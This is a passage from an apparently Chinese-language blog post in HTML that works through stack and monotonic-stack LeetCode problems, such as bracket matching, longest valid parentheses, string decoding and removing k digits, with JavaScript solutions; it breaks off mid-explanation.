        <content type="html"><![CDATA[<ul><li>括号匹配问题</li><li>最长有效括号</li><li>表现良好的最长时间段</li><li>字符串解码</li><li>去除重复字母</li><li>移掉 k 位数字</li><li>接雨水</li><li>每日温度</li></ul><h2 id="括号匹配问题"><a href="#括号匹配问题" class="headerlink" title="括号匹配问题"></a>括号匹配问题</h2><p>大致思路是遇到左括号入栈，遇到右括号将左括号出栈，复杂度为O(n)</p><pre class=" language-js"><code class="language-js">        <span class="token keyword">function</span> <span class="token function">isBalanced</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> info <span class="token operator">=</span> exp<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> info<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">let</span> el <span class="token operator">=</span> info<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>el <span class="token operator">==</span> <span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>el <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> stack<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>我们还可以把题目再向前面推进一步，如果包含三种括号怎么办：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isValid <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token punctuation">[</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"{"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"("</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"["</span><span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> str <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> str<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 判断是否为左括号</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token regex">/(\(|\[|\{)/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length<span class="token operator">===</span><span class="token number">0</span><span class="token operator">||</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">!==</span>map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> stack<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="最长有效括号"><a href="#最长有效括号" class="headerlink" title="最长有效括号"></a>最长有效括号</h2><ul><li><a href="https://leetcode-cn.com/problems/longest-valid-parentheses/" target="_blank" rel="noopener">leetcode32</a></li><li><a href="https://leetcode-cn.com/problems/longest-valid-parentheses/solution/zui-chang-you-xiao-gua-hao-by-leetcode-solution/" target="_blank" rel="noopener">题解</a></li></ul><pre class=" language-js"><code class="language-js">给定一个只包含 <span class="token string">'('</span> 和 <span class="token string">')'</span> 的字符串，找出最长的包含有效括号的子串的长度。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">"(()"</span>输出<span class="token punctuation">:</span> <span class="token number">2</span>解释<span class="token punctuation">:</span> 最长有效括号子串为 <span class="token string">"()"</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">")()())"</span>输出<span class="token punctuation">:</span> <span class="token number">4</span>解释<span class="token punctuation">:</span> 最长有效括号子串为 <span class="token string">"()()"</span></code></pre><ul><li>具体做法是我们始终保持栈底元素为当前已经遍历过的元素中「最后一个没有被匹配的右括号的下标」，这样的做法主要是考虑了边界条件的处理，栈里其他元素维护左括号的下标：</li><li>对于遇到的每个 ‘(‘，我们将它的下标放入栈中</li><li>对于遇到的每个 ‘)’，我们先弹出栈顶元素表示匹配了当前右括号：</li><li>如果栈为空，说明当前的右括号为没有被匹配的右括号，我们将其下标放入栈中来更新我们之前提到的「最后一个没有被匹配的右括号的下标」</li><li>如果栈不为空，当前右括号的下标减去栈顶元素即为「以该右括号为结尾的最长有效括号的长度」我们从前往后遍历字符串并更新答案即可。</li><li>需要注意的是，如果一开始栈为空，第一个字符为左括号的时候我们会将其放入栈中，这样就不满足提及「最后一个没有被匹配的右括号的下标」，为了保持统一，我们在一开始的时候往栈中放入一个值为 -1的元素。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> longestValidParentheses <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'('</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                ans <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> i <span class="token operator">-</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="表现良好的最长时间段"><a href="#表现良好的最长时间段" class="headerlink" title="表现良好的最长时间段"></a>表现良好的最长时间段</h2><p><a href="https://leetcode-cn.com/problems/longest-well-performing-interval/" target="_blank" rel="noopener">leetcode1124</a></p><pre class=" language-js"><code class="language-js">给你一份工作时间表 hours，上面记录着某一位员工每天的工作小时数。我们认为当员工一天中的工作小时数大于 <span class="token number">8</span> 小时的时候，那么这一天就是「劳累的一天」。所谓「表现良好的时间段」，意味在这段时间内，「劳累的天数」是严格 大于「不劳累的天数」。请你返回「表现良好时间段」的最大长度。输入：hours <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span>输出：<span class="token number">3</span>解释：最长的表现良好时间段是 <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>。</code></pre><h3 id="前置知识：前缀和，单调栈"><a href="#前置知识：前缀和，单调栈" class="headerlink" title="前置知识：前缀和，单调栈"></a>前置知识：前缀和，单调栈</h3><ul><li>数组转换并计算前缀和</li></ul><pre class=" language-js"><code class="language-js">hours <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>score <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// 大于8记1，小于8记-1</span>presum <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// 前缀和</span><span class="token comment" spellcheck="true">// presum[j] - presum[i] 代表的是 score[i] 到 score[j-1] 的区间元素和</span></code></pre><ul><li>单调栈：就是栈中元素,按递增顺序或者递减顺序排列，最大好处就是时间复杂度是线性的,每个元素遍历一次</li><li>单调递增栈可以找到左起第一个比当前数字小的元素</li><li>比如数组:<code>[3,5,4,1]</code>,我们如何要找每一个元素下一个最小数.例如:<code>3</code> 下一个最小的数为<code>1</code>,<code>5</code>下一个是<code>4</code>.我们先构造栈,把<code>3</code>压入栈中,<code>5</code>入栈时候,发现栈顶元素<code>3</code>比它小,也依次压入;当<code>4</code>时候,栈顶元素<code>5</code>大于<code>4</code>,于是得到,<code>5</code><strong>左起第一个小的元素</strong>为<code>4</code>.将<code>5</code>弹出,压入<code>4</code>.接下来元素<code>1</code>,也比栈顶元素小,于是得到<code>4</code>第一个小的元素为<code>1</code>,弹出<code>4</code>,依次类推,<code>3</code>也是<code>1</code>…栈中的元素<strong>一直保持单调递增的状态</strong>.</li></ul><hr><h3 id="回归题目"><a href="#回归题目" class="headerlink" title="回归题目"></a>回归题目</h3><ul><li>我们要找的是：一个最长的区间 能使 score的区间元素和大于 0</li><li>有了前缀和就变成了：寻找最长的区间使得 presum[j] - presum[i] &gt;0”</li><li>以任意元素presum[i]为起始点，找最右边往左找第一个满足presum[j]大于presum[i]的元素下标A[j]，找(j – i)的最大值，即最大区间。那么可以按照元素从左到右建单调递减的栈，然后从右到左找满足要求的最区间。</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/** * @param {number[]} hours * @return {number} */</span><span class="token keyword">var</span> longestWPI <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>hours<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 转换成: [1,  1, -1, -1, -1, -1, 1]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> hours<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hours<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            hours<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            hours<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 求前缀和: [0, 1, 2, 1, 0, -1, -2, -1]</span>    <span class="token keyword">let</span> presum <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    presum<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> hours<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        presum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> presum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">+</span> hours<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 构造单调递减栈：存储的是索引 [0, 5, 6]，对应前缀和中的 [0, -1, -2]</span>    <span class="token comment" spellcheck="true">// 我们最后要求的最大的宽度坡一定是以这个序列中的某一个i为坡底的(自己理解一下)</span>    <span class="token comment" spellcheck="true">// 最大宽度坡：假设存在某个元素位置k不存在于上面的递减序列中，且有最大宽度j-k，</span>    <span class="token comment" spellcheck="true">// 这也就说明k位置的元素一定是小于k前面所有的元素的，否则就会有更长的宽度，但是既然k小于前面所有的元素，</span>    <span class="token comment" spellcheck="true">// 那么k就一定会被加入到序列中，与假设矛盾，所以不存在k，解一定存在递减序列中</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    stack<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> presum<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> presum<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 小于栈顶则 push</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>presum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> presum<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//  从尾部遍历presum</span>    <span class="token comment" spellcheck="true">//  如果该位置元素比stack中存储的位置的元素高，则表明为上坡路</span>    <span class="token comment" spellcheck="true">//  弹出栈顶元素（因为再往前遍历长度会减小），并记录坐标差，该坐标差即为上坡路的长度</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> presum<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">></span> ans<span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 注意此处是 while，满足条件 pop 之后会继续比较</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> presum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> presum<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            ans <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> i <span class="token operator">-</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>类似题目：<a href="https://leetcode-cn.com/problems/maximum-width-ramp/" target="_blank" rel="noopener">leetcode962:最大宽度坡</a></p><h2 id="字符串解码"><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h2><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"3[a]2[bc]"</span>输出：<span class="token string">"aaabcbc"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"3[a2[c]]"</span>输出：<span class="token string">"accaccacc"</span>示例 <span class="token number">3</span>：输入：s <span class="token operator">=</span> <span class="token string">"2[abc]3[cd]ef"</span>输出：<span class="token string">"abcabccdcdcdef"</span>示例 <span class="token number">4</span>：输入：s <span class="token operator">=</span> <span class="token string">"abc3[cd]xyz"</span>输出：<span class="token string">"abccdcdcdxyz"</span></code></pre><ul><li>题目来源：<a href="https://leetcode-cn.com/problems/decode-string/" target="_blank" rel="noopener">leetcode394</a></li><li>正则解法</li></ul><pre class=" language-js"><code class="language-js">    <span class="token function">decodeString</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> reg <span class="token operator">=</span> <span class="token regex">/(\d+)\[(\w+)\]/g</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// replace 第二个参数可以为函数</span>        <span class="token comment" spellcheck="true">// 参数：匹配到的，$1，$2，索引，源字符串</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>matchStr<span class="token punctuation">,</span> group1<span class="token punctuation">,</span> group2<span class="token punctuation">,</span> index<span class="token punctuation">,</span> sourceStr<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">""</span>          <span class="token keyword">while</span><span class="token punctuation">(</span>group1<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            str <span class="token operator">+</span><span class="token operator">=</span>  group2          <span class="token punctuation">}</span>          <span class="token keyword">return</span> str<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">}</span></code></pre><h2 id="去除重复字母（单调栈）"><a href="#去除重复字母（单调栈）" class="headerlink" title="去除重复字母（单调栈）"></a>去除重复字母（单调栈）</h2><pre class=" language-js"><code class="language-js">给你一个字符串 s ，请你去除字符串中重复的字母，使得每个字母只出现一次。需保证 返回结果的字典序最小（要求不能打乱其他字符的相对位置）。 示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"bcabc"</span>输出：<span class="token string">"abc"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"cbacdcbc"</span>输出：<span class="token string">"acdb"</span></code></pre><ul><li>用 map 存储字符串中每个字符出现的次数</li><li>遍历字符串，每访问一个字符，将字符入栈，并且当前字符次数减1。入栈之前首先需要判断，当前字符的字典序若小于栈顶字符（栈顶字符次数大于0），则栈顶字符先出栈</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> removeDuplicateLetters <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        map<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> map<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> map<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        map<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> stack<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="移掉-k-位数字（单调栈）"><a href="#移掉-k-位数字（单调栈）" class="headerlink" title="移掉 k 位数字（单调栈）"></a>移掉 k 位数字（单调栈）</h2><ul><li>题目：<a href="https://leetcode-cn.com/problems/remove-k-digits" target="_blank" rel="noopener">leetcode402</a></li><li>可参考：<a href="https://leetcode-cn.com/problems/remove-k-digits/solution/yi-zhao-chi-bian-li-kou-si-dao-ti-ma-ma-zai-ye-b-5/" target="_blank" rel="noopener">一招吃遍力扣四道题，妈妈再也不用担心我被套路啦～</a></li></ul><pre class=" language-js"><code class="language-js">给定一个以字符串表示的非负整数 num，移除这个数中的 k 位数字，使得剩下的数字最小。注意<span class="token punctuation">:</span>num 的长度小于 <span class="token number">10002</span> 且 ≥ k。num 不会包含任何前导零。示例 <span class="token number">1</span> <span class="token punctuation">:</span>输入<span class="token punctuation">:</span> num <span class="token operator">=</span> <span class="token string">"1432219"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">3</span>输出<span class="token punctuation">:</span> <span class="token string">"1219"</span>解释<span class="token punctuation">:</span> 移除掉三个数字 <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> 和 <span class="token number">2</span> 形成一个新的最小的数字 <span class="token number">1219</span>。示例 <span class="token number">2</span> <span class="token punctuation">:</span>输入<span class="token punctuation">:</span> num <span class="token operator">=</span> <span class="token string">"10200"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">1</span>输出<span class="token punctuation">:</span> <span class="token string">"200"</span>解释<span class="token punctuation">:</span> 移掉首位的 <span class="token number">1</span> 剩下的数字为 <span class="token number">200</span><span class="token punctuation">.</span> 注意输出不能有任何前导零。示例 <span class="token number">3</span> <span class="token punctuation">:</span>输入<span class="token punctuation">:</span> num <span class="token operator">=</span> <span class="token string">"10"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">2</span>输出<span class="token punctuation">:</span> <span class="token string">"0"</span>解释<span class="token punctuation">:</span> 从原数字移除所有的数字，剩余为空就是<span class="token number">0</span>。</code></pre><pre class=" language-js"><code class="language-js">给定一个数字序列，例如 <span class="token number">425</span>，如果要求我们只删除一个数字，那么从左到右，我们有 <span class="token number">4</span>、<span class="token number">2</span> 和 <span class="token number">5</span> 三个选择。我们将每一个数字和它的左邻居进行比较。从 <span class="token number">2</span> 开始，小于它的左邻居 <span class="token number">4</span>。则我们应该去掉数字 <span class="token number">4</span>。如果不这么做，则随后无论做什么，都不会得到最小数。如果我们保留数字 <span class="token number">4</span>，那么所有可能的组合都是以数字 <span class="token number">4</span>（即 <span class="token number">42</span>，<span class="token number">45</span>）开头的。相反，如果去掉 <span class="token number">4</span>，留下 <span class="token number">2</span>，我们得到的是以 <span class="token number">2</span> 开头的组合（即 <span class="token number">25</span>），这明显小于任何留下数字 